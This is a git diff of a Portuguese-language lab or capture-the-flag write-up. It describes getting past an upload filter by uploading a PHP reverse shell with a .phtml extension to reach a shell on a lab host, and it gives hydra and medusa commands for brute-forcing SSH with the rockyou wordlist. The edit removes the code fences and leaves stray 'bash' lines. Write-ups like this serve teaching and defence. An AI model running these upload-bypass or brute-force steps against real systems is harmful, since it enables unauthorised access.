@@ -62,21 +62,17 @@ Upload de um `php-reverse-shell.phtml` (extensão usada para contornar
 filtro de upload que bloqueava `.php`) através do formulário encontrado
 em `/internal/`, e acesso ao arquivo via navegador para executar o payload:
 
-\`\`\`
 http://10.64.131.169:3333/internal/uploads/php-reverse-shell.phtml
-\`\`\`
 
 **Resultado:** conexão reversa recebida no listener, obtendo shell no
 sistema alvo.
 
-\`\`\bash
+bash
 hydra -l bill -P /usr/share/wordlists/rockyou.txt 10.64.131.169 ssh
-\`\`\
 
-**Equivalente em Medusa** (ferramenta foco original do desafio):
-\`\`\`bash
+bash
 medusa -h 10.64.131.169 -u bill -P /usr/share/wordlists/rockyou.txt -M ssh
-\`\`\`
+
 
 ## Medidas de mitigação recomendadas
 
